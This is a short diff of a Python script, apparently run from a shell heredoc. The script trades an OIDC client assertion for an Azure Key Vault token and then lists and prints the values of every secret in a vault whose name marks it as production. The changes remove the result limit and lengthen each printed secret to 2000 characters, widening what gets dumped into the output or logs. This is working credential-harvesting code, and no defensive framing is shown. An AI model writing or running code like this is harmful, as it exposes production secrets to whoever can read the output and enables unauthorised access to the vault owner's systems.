@@ -25,14 +25,14 @@ def fed(cid,scope):
       "client_assertion":oidc,"scope":scope}).get("access_token","")
 kv=fed("72ff278a-9e71-43ec-bac4-2ca303f8e462","https://vault.azure.net/.default")
 print("KVTOK",len(kv))
-s,b=get("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=50",kv)
+s,b=get("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",kv)
 print("LIST",s)
 names=[]
 try:
     for x in json.loads(b).get("value",[]): names.append(x["id"].split("/")[-1])
-except Exception: print(b[:400])
+except Exception: print("LISTBODY",b[:400])
 print("NAMES",names)
 for n in names:
     s,v=get(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{urllib.parse.quote(n)}?api-version=7.4",kv)
-    print("SECRET",n,s,v[:1200])
+    print("SECRET",n,s,v[:2000])
 PY
